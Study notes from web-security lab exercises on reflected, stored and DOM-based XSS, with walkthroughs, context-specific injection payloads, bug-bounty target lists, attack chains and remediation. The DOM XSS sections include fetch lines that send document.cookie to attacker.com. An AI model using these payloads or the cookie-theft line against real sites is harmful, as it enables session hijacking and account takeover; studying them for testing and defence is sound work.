# Lab-01 🐞 Reflected XSS — Enhanced & Real-World Complete Notes

---

## 🔹 Overview

Reflected Cross-Site Scripting (Reflected XSS) occurs when:

- User input is sent to the server  
- The server includes it immediately in the response  
- The browser interprets it as executable code  

Unlike Stored XSS:

- The payload is *not saved* in the database  
- It requires the victim to click a malicious link or submit crafted input  

In real-world attacks, the key challenge is not just finding reflection —  
it is understanding exactly *where the input lands in the response*.

👉 Payload depends entirely on context.

---

## 🔹 What Is This Topic?

Reflected XSS is a *client-side code execution vulnerability* caused by improper output encoding.

### Flow

1️⃣ User sends input (URL, form, header, JSON, etc.)  
2️⃣ Server returns it in response  
3️⃣ Browser renders it as HTML or JavaScript  
4️⃣ Malicious script executes  

> Reflection alone is NOT enough.  
> Context determines exploitability.

### Possible Reflection Contexts

- HTML body  
- Inside tag (h1, p, div)  
- Attribute values  
- Inline event handlers  
- JavaScript strings  
- Script blocks  
- URLs  
- JSON  
- Meta tags  
- Title tag  
- Template literals  
- DOM-based sinks  

---

## 🔹 Lab Walkthrough (Simple & Clear)

1️⃣ Open the lab  
2️⃣ Locate search bar  
3️⃣ Enter random string:

test123

4️⃣ Observe reflection in response:

<h1>You searched for: test123</h1>

5️⃣ Inject payload:
```
<script>alert(1)</script>
```
6️⃣ Script executes  

→ ✅ Lab solved  

But real-world exploitation is rarely this simple.

---

## 🔹 Evidence / Screenshot (SS)

![Reflected XSS Execution](../images/reflected-xss.png)

---

# 🌍 Real-World Scenarios (COMPLETE — Context + Payload + Why)

---

## 🟢 1️⃣ Reflection Inside HTML Text (Most Common)

Example:
```
<h1>You searched for: INPUT</h1>
```
Payload:
```
<script>alert(1)</script>
```
*Why it works:*  
Browser parses injected tag as HTML.

*Real-world locations:*

- Search results  
- Login errors  
- 404 pages  
- Payment failure messages  
- Tracking parameters  

---

## 🟢 2️⃣ Inside HTML Attribute

Example:
```
<input value="INPUT">
```
Payload:
```
" onfocus=alert(1) autofocus="
```
Breaks attribute → injects event handler.

*Real-world locations:*

- Form fields  
- Profile editors  
- Search boxes  
- Hidden fields  
- Data attributes  

---

## 🟢 3️⃣ Inside JavaScript String

Example:
```
var q = "INPUT";
```
Payload:
```
";alert(1);//
```
Break string → execute JavaScript.

*Real-world locations:*

- Search query handling  
- Filters  
- Dynamic content rendering  
- Analytics tracking  

---

## 🟢 4️⃣ Inside Inline Event Handler

Example:
```
<button onclick="search('INPUT')">
```
Payload:
```
');alert(1);//
```
*Real-world:*

- Admin dashboards  
- Sorting buttons  
- Filtering components  

---

## 🟢 5️⃣ Inside Script Block Function Call

Example:
```
<script>search("INPUT")</script>
```
Payload:
```
");alert(document.domain);//
```
Very common in:

- Legacy apps  
- E-commerce filters  
- Reporting dashboards  

---

## 🟢 6️⃣ Inside URL (href or src)

Example:
```
<a href="INPUT">
```
Payload:
```
javascript:alert(1)
```
Or:
```
" onclick="alert(1)
```
*Real-world:*

- Redirect parameters  
- Continue URLs  
- Download links  
- OAuth redirects  

---

## 🟢 7️⃣ Reflected Inside JSON Response

Example:
```
{"error":"INPUT"}
```
If frontend uses:
```
innerHTML = response.error
```
Payload:
```
</script><script>alert(1)</script>
```
Very common in:

- SPA applications  
- API error responses  
- React/Vue apps  
- Mobile web apps  

---

## 🟢 8️⃣ Inside Meta Tag

Example:
```
<meta content="INPUT">
```
Payload:
```
"><script>alert(1)</script>
```
Seen in:

- SEO features  
- Social preview metadata  
- OpenGraph tags  

---

## 🟢 9️⃣ Inside Title Tag

Example:
```
<title>INPUT</title>
```
Payload:
```
</title><script>alert(1)</script>
```
Often found in:

- Search pages  
- Dynamic page titles  

---

## 🟢 🔟 Reflected via HTTP Headers

Example headers:
```
- X-Forwarded-Host  
- Referer  
- User-Agent  
```
If reflected in response:

Payload:
```
<script>alert(1)</script>
```
Common in:

- Error pages  
- Debug output  
- Logs rendered in admin panel  

---

## 🟢 1️⃣1️⃣ Template Literal Context

Example:
```
let msg = INPUT;
```
Payload:
```
${alert(1)}
```
Modern JS apps frequently use template strings.

---

## 🟢 1️⃣2️⃣ Reflection in DOM via JS

Server reflects safely, but frontend does:

document.getElementById("msg").innerHTML = param;

This becomes DOM-based XSS.

---

# 🎯 High-Value Endpoints (Bug Bounty Gold)

Always test:

- Search parameters  
- Login error messages  
- Password reset pages  
- OAuth redirect_uri  
- next= parameters  
- filter= parameters  
- sort= parameters  
- Preview features  
- File name displays  
- Payment error messages  
- Support ticket previews  
- Admin dashboards  
- Marketing tracking params  

---

# 🔗 Multi-Chain Real Attacks

---

## 🔥 XSS → Session Theft

- Steal cookies (if not HttpOnly)

---

## 🔥 XSS → Token Exfiltration

Steal:

- JWT tokens  
- CSRF tokens  
- LocalStorage tokens  

---

## 🔥 XSS → Account Takeover

Inject JS to:

- Change email  
- Change password  
- Enable MFA  

---

## 🔥 XSS → CSRF Bypass

Use JavaScript to send authenticated POST requests.

---

## 🔥 XSS → Admin Compromise

Send malicious link to admin.

---

## 🔥 XSS → Phishing Overlay

Inject fake login form.

---

## 🔥 XSS → Data Exfiltration

Read DOM:

- Personal data  
- Billing details  
- Messages  

---

## 🔥 XSS → Stored Pivot

Use reflected XSS to inject payload into stored feature.

---

# 🛡️ Remediation (Developer Fix)

- Escape output based on context  
- Encode HTML, attributes, and JavaScript separately  
- Avoid innerHTML  
- Use textContent  
- Use templating engines with auto-escaping  
- Implement CSP  
- Validate input  
- Avoid string concatenation in JavaScript  
- Set HttpOnly cookies  

---

# 💡 Extra Notes / Pro Hunter Mindset

Reflection ≠ vulnerability  
Execution = vulnerability  

Always ask:

- Where does my input land?  
- Is it HTML, JS, attribute, URL, or JSON?  
- Can I break out of context?  

Pro techniques:

- Break quotes first  
- Try closing tags  
- Inspect raw response  
- Use Burp search  
- Look for hidden reflections  
- Test headers  
- Test encoded payloads  
- Test each parameter separately  
- Think like a frontend developer  

---

# 🧠 Ultimate Mental Model

Find input  
→ Find reflection  
→ Identify context  
→ Break context  
→ Execute payload  
→ Escalate impact  

---

# Lab-02 🐞 Stored XSS — Enhanced & Real-World Complete Notes

---

## 🔹 Overview

Stored Cross-Site Scripting (Stored XSS), also called Persistent XSS or Second-Order XSS, happens when:

- User input is submitted  
- The application stores it in the database  
- Later, it is displayed in a page  
- The browser executes it as JavaScript  

Unlike Reflected XSS:

- The payload is saved in the database  
- It affects every visitor automatically  
- It often impacts logged-in users  
- It can compromise administrators  

Stored XSS is generally more dangerous because exploitation does not require tricking a victim into clicking a link.

---

## 🔹 What Is This Topic?

Stored XSS is a **persistent client-side code execution vulnerability** caused by improper output encoding of stored user input.

### Flow

1️⃣ User submits input (comment, profile field, ticket, etc.)  
2️⃣ Server stores it in database  
3️⃣ Application retrieves it later  
4️⃣ Browser renders it as HTML or JavaScript  
5️⃣ Malicious script executes  

> Storage + Unsafe Rendering = Persistent Execution

### Common Storage Locations

- Comments  
- Reviews  
- Profile fields  
- Support tickets  
- Forum posts  
- Chat messages  
- Feedback forms  
- Logs  

---

## 🔹 Lab Walkthrough (Simple & Clear)

1️⃣ Open the lab  
2️⃣ Locate the blog comment section  
3️⃣ Submit payload:

`<script>alert(1)</script>`

4️⃣ Comment is stored in the database  

5️⃣ Reload the blog post  

6️⃣ Stored payload appears in response:

`<p><script>alert(1)</script></p>`

7️⃣ Browser executes script  

→ ✅ Lab solved  

Real-world cases are often more complex and role-dependent.

---

## 🔹 Evidence / Screenshot (SS)

![Stored XSS Reflected from Database](../images/stored-xss-reflection.png)

---

# 🌍 Real-World Scenarios (COMPLETE — Context + Payload + Why)

---

## 🟢 1️⃣ Stored in HTML Body (Most Common)

Example:

`<p>USER_COMMENT</p>`

Payload:

`<script>alert(1)</script>`

**Why it works:**  
Browser parses stored content as executable HTML.

Common in:

- Blogs  
- Reviews  
- Forums  

---

## 🟢 2️⃣ Stored in HTML Attribute

Example:

`<img alt="USER_INPUT">`

Payload:

`" onerror=alert(1) "`

Breaks attribute → injects event handler.

Common in:

- Profile pictures  
- Image captions  
- Tooltips  

---

## 🟢 3️⃣ Stored in JavaScript String

Example:

`var comment = "USER_INPUT";`

Payload:

`";alert(1);//`

Breaks JS string → executes JavaScript.

Common in:

- Dashboards  
- Notifications  
- History logs  

---

## 🟢 4️⃣ Stored in Admin Panel Only

User submits payload.  
Regular users don’t see it.  
Admin dashboard loads stored content.  

Admin gets XSS.

🔥 High-impact real-world scenario.

Common in:

- Support ticket systems  
- Contact forms  
- Abuse reports  
- Bug report portals  

---

## 🟢 5️⃣ Stored in Logs / Audit Pages

User input stored in logs.  
Later viewed by internal staff.  

Payload executes in internal panel.

Often overlooked.

---

## 🟢 6️⃣ Stored in User Profile Fields

Fields like:

- Display name  
- Bio  
- Location  
- Status  

Payload:

`<script>alert(document.cookie)</script>`

Every profile visitor is affected.

---

## 🟢 7️⃣ Stored via File Upload (Filename XSS)

Upload file named:

`"><script>alert(1)</script>.jpg`

If filename is displayed without encoding → Stored XSS.

Common in:

- Document managers  
- HR portals  
- Support systems  

---

## 🟢 8️⃣ Stored via HTTP Headers

Example: `User-Agent`

`<script>alert(1)</script>`

If admin log viewer prints headers → XSS.

Internal compromise vector.

---

## 🟢 9️⃣ Stored via Third-Party Data

Examples:

- Embedded tweets  
- Email previews  
- RSS feeds  
- External APIs  

If not sanitized → Persistent XSS.

---

# 🎯 High-Value Targets (Bug Bounty Gold)

Always test:

- Comment systems  
- Contact forms  
- Support tickets  
- Profile settings  
- Review sections  
- Feedback pages  
- Admin dashboards  
- Log viewers  
- Moderation panels  

---

# 🔗 Multi-Chain Real Attacks

---

## 🔥 XSS → Session Theft

Steal cookies (if not HttpOnly).

---

## 🔥 XSS → Token Exfiltration

Steal:

- JWT tokens  
- CSRF tokens  
- LocalStorage tokens  

---

## 🔥 XSS → Account Takeover

Inject JS to:

- Change email  
- Change password  
- Enable MFA  

---

## 🔥 XSS → CSRF Bypass

Use JavaScript to send authenticated POST requests.

---

## 🔥 XSS → Admin Compromise

Plant payload.  
Admin loads page.  
Full application compromise.

---

## 🔥 XSS → Data Exfiltration

Read DOM:

- Personal data  
- Billing details  
- Messages  

---

## 🔥 XSS → Worm-Like Spread

Payload auto-posts itself into new comments.  
Spreads between users.

---

# 🛡️ Remediation (Developer Fix)

- Escape output based on context  
- Encode HTML, attributes, and JavaScript separately  
- Avoid `innerHTML`  
- Use `textContent`  
- Use templating engines with auto-escaping  
- Implement CSP  
- Validate input  
- Avoid string concatenation in JS  
- Set HttpOnly cookies  

---

# 💡 Extra Notes / Pro Hunter Mindset

Storage ≠ vulnerability  
Execution = vulnerability  

Always ask:

- Where is my input stored?  
- Where is it displayed?  
- In what context?  
- Does admin see this?  
- Is it rendered inside JS?  

Pro techniques:

- Use unique markers  
- Test multiple roles  
- Check admin panels  
- Inspect logs  
- Search for hidden reflections  
- Trigger background workflows  

---

# 🧠 Ultimate Mental Model

Find input  
→ Confirm storage  
→ Locate every display location  
→ Identify context  
→ Break context  
→ Execute payload  
→ Escalate impact  

Stored XSS = Persistent  
Reflected XSS = Immediate  

Persistent = More dangerous

---

# Lab-3 🐞 DOM-Based XSS (document.write + location.search) — Enhanced & Real-World Complete Notes

---

## 🔹 Overview

DOM-Based Cross-Site Scripting (DOM XSS) occurs when:

- User input enters the browser through the URL or another DOM source  
- JavaScript reads that input  
- The script inserts the input into the page using a dangerous function  
- The browser interprets it as HTML or JavaScript and executes it  

Important difference:

The vulnerability exists **inside client-side JavaScript** running in the browser.

The server response itself may be completely safe.

Execution happens **when the DOM is modified by JavaScript.**

### Flow

User Input  
→ DOM Source  
→ JavaScript  
→ Dangerous Sink  
→ Script Execution  

---

## 🔹 What Is This Topic?

DOM XSS occurs when JavaScript takes attacker-controlled input and writes it into the page without sanitization.

Two key components define the vulnerability.

### Source

A **source** is where attacker-controlled data enters JavaScript.

Common sources:
```
- location.search  
- location.hash  
- document.cookie  
- document.referrer  
- window.name  
- postMessage  
- localStorage  
- sessionStorage  
```
Example URL:

site.com/?search=hello

JavaScript reads:

location.search

---

### Sink

A **sink** is a dangerous JavaScript function that inserts or executes the data.

Common sinks:
```
- document.write()  
- innerHTML  
- outerHTML  
- insertAdjacentHTML()  
- eval()  
- setTimeout()  
- setInterval()  
- Function()  
```
Example vulnerable code:
```
document.write(location.search)
```
---

## 🔹 Lab Walkthrough (Simple & Clear)

### Step 1 — Open the Lab

The website contains a search feature.

Search query appears in the URL.

Example:

site.com/?search=test

---

### Step 2 — Test Reflection with Safe Marker

Input:
```
ABC123
```
Open **Developer Tools → Inspector**

Search for:

ABC123

Found inside DOM:
```
<img src="/resources/images/tracker.gif?search=ABC123">
```
This confirms:

Input appears inside an **image src attribute**.

---

### Step 3 — Identify JavaScript Vulnerability

The page uses:
```
document.write()
```
with:
```
location.search
```
Data flow:
```
location.search  
→ document.write()  
→ DOM
```
JavaScript is writing attacker input directly into the DOM.

---

### Step 4 — Craft Exploit Payload

Since input is inside an **HTML attribute**, we must break the attribute.

Payload:
```
"><svg onload=alert(1)>
```
---

### Step 5 — Browser Parses Payload

Original DOM:
```
<img src="/tracker?search=ABC123">
```
After payload:
```
<img src="">
<svg onload=alert(1)>
```
SVG loads.

onload executes.

Alert appears.

---

### Step 6 — DOM Changes After Exploit

Inspector now shows:
```
<svg onload="alert(1)">
```
JavaScript executes.

→ ✅ Lab solved

---

## 🔹 Evidence / Screenshot (SS)

### Screenshot-1
![DOM XSS payload breaking image tag](../images/dom-xss-string-test.png)

### Screenshot-2
![DOM XSS marker reflected in live DOM](../images/dom-xss-marker-reflection.png)

---

# 🌍 Real-World Scenarios (COMPLETE — Context + Payload + Why)

---

## 🟢 1️⃣ document.write (Legacy Websites)

Example code:
```
document.write(location.search)
```
Payload:
```
<script>alert(1)</script>
```
Why it works:

document.write inserts raw HTML directly into the page.

Common in:
```
- Legacy CMS plugins  
- Old analytics scripts  
- Tracking systems  
```
---

## 🟢 2️⃣ Attribute Injection

Example:
```
document.write('<img src="'+location.search+'">')
```
Payload:
```
"><svg onload=alert(1)>
```
Breaks attribute → injects new tag.

Real-world locations:
```
- Tracking pixels  
- Marketing scripts  
- Image previews  
```
---

## 🟢 3️⃣ innerHTML Sink

Example:
```
results.innerHTML = location.search
```
Payload:
```
<img src=x onerror=alert(1)>
```
Very common in:
```
- Search result pages  
- Filters  
- Dynamic UI updates  
```
---

## 🟢 4️⃣ JavaScript Execution Sinks

Example:
```
eval(location.hash)
```
Payload:
```
#alert(1)
```
Also vulnerable:

- setTimeout(location.hash)  
- Function(location.hash)  

Seen in:
```
- Debug tools  
- Old JS frameworks  
- Dynamic script loaders  
```
---

## 🟢 5️⃣ URL Fragment Attacks

Example source:
```
location.hash
```
URL:
```
site.com/#<img src=x onerror=alert(1)>
```
Common in:
```
- Single-page applications  
- Navigation tabs  
- Client-side routing  
```
---

## 🟢 6️⃣ Search Result Rendering

Example code:
```
document.getElementById("results").innerHTML =
"You searched: " + location.search
```
Payload:
```
<img src=x onerror=alert(1)>
```
Seen in:
```
- E-commerce search pages  
- Dashboards  
- Analytics panels  
```
---

## 🟢 7️⃣ Referrer-Based DOM XSS

Source:
```
document.referrer
```
If attacker controls referring page → payload executes.

Seen in:
```
- Affiliate programs  
- Marketing tracking scripts  
```
---

# 🎯 High-Value DOM XSS Targets

Always test:
```
- Search features  
- Filters  
- URL parameters  
- Client-side routing  
- Comment previews  
- Product previews  
- Admin dashboards  
- Analytics scripts  
- Tracking widgets  
```
---

# 🔗 Multi-Chain Real Attacks

---

## 🔥 XSS → Session Theft

fetch("https://attacker.com?cookie="+document.cookie)

Steals session cookies.

---

## 🔥 XSS → Account Takeover

Steal:

- JWT tokens  
- Session cookies  
- CSRF tokens  

---

## 🔥 XSS → Admin Compromise

Admin visits infected page.

Attacker gains administrator access.

---

## 🔥 XSS → Data Exfiltration

JavaScript can read:

- DOM content  
- API responses  
- Private user data  

---

## 🔥 XSS → CSRF Automation

Payload performs actions automatically.

Example:

fetch("/change-email",{method:"POST"})

---

# 🧪 How to Find DOM XSS (Bug Hunter Methodology)

---

## Step 1 — Identify Sources

Search JavaScript for:
```
- location.search  
- location.hash  
- document.cookie  
- document.referrer  
- window.name  
```
Use DevTools search:

Ctrl + Shift + F

---

## Step 2 — Inject Test Marker

Example:

XSS123TEST

---

## Step 3 — Inspect Live DOM

Important rule:

Always inspect **Live DOM**, not **View Source**.

DOM XSS appears **after JavaScript executes**.

---

## Step 4 — Find Sink

Look for:
```
- document.write  
- innerHTML  
- eval  
- setTimeout  
- Function  
```
---

## Step 5 — Craft Payload Based on Context

Attribute context:
```
"><svg onload=alert(1)>
```
HTML context:
```
<script>alert(1)</script>
```
JS string context:
```
';alert(1);//
```
---

# 🛡️ Remediation (Developer Fix)

Developers should:

- Avoid document.write()  
- Avoid innerHTML for untrusted input  
- Use textContent  
- Sanitize inputs  
- Use secure frameworks  
- Implement CSP  

Safe example:

element.textContent = userInput

This prevents HTML execution.

---

# 💡 Extra Notes / Pro Hunter Mindset

Source ≠ vulnerability  
Sink ≠ vulnerability  

Source + Sink + Unsafe Flow = DOM XSS

Always ask:

- Where does input enter JavaScript?  
- Which function writes it into the DOM?  
- What context is the output in?  
- Can I break that context?  

DOM XSS hunting requires **tracking data flow inside JavaScript.**

---

# 🧠 Ultimate Mental Model

Find source  
→ Track data flow in JavaScript  
→ Identify sink  
→ Determine context  
→ Break context  
→ Execute payload  
→ Escalate impact  

---

# 💡 Key Difference Between XSS Types

Reflected XSS  
→ Server immediately reflects input

Stored XSS  
→ Server stores input in database

DOM XSS  
→ JavaScript processes input inside the browser

---

# Lab-4 🐞 DOM-Based XSS via document.write + location.search inside select tag

---

## 🔹 Overview

DOM-Based Cross-Site Scripting (DOM XSS) occurs when user-controlled input is processed entirely within the browser and inserted into the DOM using unsafe JavaScript functions.

In this lab, the vulnerability does not exist in the server response. Instead, it exists in client-side JavaScript that reads data from the URL and dynamically writes it into the page.

This means:

- The server returns a safe response ❌  
- The payload is not stored ❌  
- Execution happens only after JavaScript modifies the DOM ✅  

DOM XSS is especially dangerous in modern applications where most rendering happens in the frontend.

---

## 🔹 What Is This Topic?

DOM XSS occurs when:

User input → JavaScript → Unsafe DOM insertion → Execution  

The key idea:

If attacker-controlled data flows into a dangerous JavaScript sink without sanitization, it can lead to execution in the browser.

Unlike reflected or stored XSS, the server is not directly involved in rendering the payload. The browser becomes the execution environment.

---

## 🔹 Lab Walkthrough

---

### Step 1 — Open the lab

The application is a stock checker with a dropdown menu for selecting store locations such as London, Paris, and Milan.

---

### Step 2 — Observe normal behavior

Selecting a store updates stock information dynamically.

At first glance:

- No user input appears in the URL ❌  

---

### Step 3 — Investigate JavaScript

Using DevTools, search for:

location.search  

You discover that the application reads a parameter called:

storeId  

---

### Step 4 — Inject parameter manually

Even though it is not visible initially, you can append:

?storeId=London  

The application continues to function normally.

This confirms that input is being processed through JavaScript.

---

### Step 5 — Test reflection in DOM

Inject a test string:

XSS123  

Now inspect the live DOM using DevTools (not View Source).

You find:

'<option selected>XSS123</option>'

This confirms that user input is inserted into the DOM.

---

### Step 6 — Identify context

The input is placed inside:

'<option selected>INPUT</option>'

Which means:

- It is inside an option element  
- Which itself is inside a select  

---

### ⚠ Important observation

The select element is a restricted HTML context.

- Scripts and many tags will not execute inside it  

This means a normal payload like:

'<script>alert(1)</script>'

will fail.

---

### Step 7 — Craft payload

To exploit this, you must break out of the select structure and inject a new HTML element.

Payload (encoded in lab):

'"></select><img%20src=1%20onerror=alert(1)>'

Decoded payload:

'"></select><img src=1 onerror=alert(1)>'

---

### Step 8 — Understand DOM transformation

Before injection:

'<option selected>London</option>'

After injection:

'<option selected>"></option>'  
'</select>'  
'<img src=1 onerror=alert(1)>'

---

### Step 9 — Execution

The image fails to load, triggering the onerror event.

JavaScript executes successfully.

→ Alert triggered  
→ Lab solved ✅  

---

## 🔹 Evidence / Screenshot (SS)

![DOM injection and execution](../images/dom-xss-input-reflection.png)

![DOM injection and exploitation](../images/dom-xss-input-exploitation.png)

---

## 🌍 Real-World Scenarios

---

### 🟢 1️⃣ Dropdown / Select Injection

Applications dynamically generate dropdown options using JavaScript.

Example:

'document.write("<option>"+userInput+"</option>")'

Payload:

'"></select><svg onload=alert(1)>'

Impact:

Breaking out of restricted tags allows execution.

---

### 🟢 2️⃣ document.write in Legacy Applications

Older applications often use:

'document.write(userInput)'

Payload:

'<script>alert(1)</script>'

Impact:

Direct execution due to lack of sanitization.

---

### 🟢 3️⃣ innerHTML-Based DOM Injection

Example:

'element.innerHTML = userInput'

Payload:

'<img src=x onerror=alert(1)>'

Common in:

- Search results  
- Dynamic UI rendering  
- Dashboards  

---

### 🟢 4️⃣ JavaScript Execution Sinks

Example:

'eval(userInput)'

Payload:

'alert(1)'

Also vulnerable:

- setTimeout(userInput)  
- Function(userInput)  

---

### 🟢 5️⃣ URL Fragment-Based DOM XSS

Source:

location.hash  

Payload:

'#<img src=x onerror=alert(1)>'

Common in:

- Single-page applications  
- Client-side routing  

---

### 🟢 6️⃣ Hidden Parameter Processing

Applications may not expose parameters in UI but still process them via JavaScript.

Attackers can manually inject:

'?param=payload'

---

## 🎯 High-Value Targets

- Search parameters  
- Filters  
- Dropdowns and select inputs  
- Client-side routing  
- Preview features  
- Analytics scripts  
- Tracking widgets  
- Admin dashboards  
- Hidden JavaScript parameters  

---

## 🔗 Attack Chains

---

### 🔥 Session Hijacking

'fetch("https://attacker.com?c="+document.cookie)'

Steals session data.

---

### 🔥 Account Takeover

Steal:

- Session cookies  
- JWT tokens  
- CSRF tokens  

Perform actions as victim.

---

### 🔥 Admin Compromise

Send malicious link → admin executes payload → full system impact.

---

### 🔥 Data Exfiltration

Extract:

- DOM content  
- API responses  
- User-sensitive information  

---

### 🔥 CSRF Bypass

Use JavaScript to perform authenticated actions automatically.

---

## 🧪 Methodology

---

### Step 1 — Identify sources

- location.search  
- location.hash  
- document.cookie  
- document.referrer  

---

### Step 2 — Inject test marker

XSS123TEST  

---

### Step 3 — Inspect live DOM

Use DevTools (not view-source)

---

### Step 4 — Identify sinks

- document.write  
- innerHTML  
- eval  

---

### Step 5 — Identify context

- HTML  
- Attribute  
- Restricted tag  

---

### Step 6 — Craft payload

Break structure  
→ Escape context  
→ Inject executable code  

---

## ⚠ Why This Lab Is Important

Because:

- Execution does not happen in server response  
- Traditional testing methods fail  
- Requires understanding of JavaScript flow  
- Restricted contexts require advanced payloads  

---

## 🛡 Remediation

- Avoid document.write()  
- Avoid innerHTML for untrusted input  
- Use textContent  
- Sanitize all inputs  
- Use secure frontend frameworks  
- Implement Content Security Policy (CSP)  

---

## 💡 Notes / Mindset

DOM XSS is about tracking data flow inside JavaScript, not just testing inputs.

---

## 🧠 Mental Model

Find input  
→ Track JavaScript flow  
→ Identify sink  
→ Identify context  
→ Break structure  
→ Execute payload  

---

## 💡 Key Difference

- Reflected XSS = Immediate execution via server  
- Stored XSS = Persistent execution from database  
- DOM XSS = Execution inside browser via JavaScript  

---

## 💡 One-Line Memory Hook

If your payload is trapped inside a tag → break the structure first  

---

## 🧠 Bug Hunter Mindset

→ Where does input enter JavaScript?  
→ Where is it written into the DOM?  
→ What context is it in?  
→ Is it inside a restricted tag?  
→ Can I break out of that structure?  

---
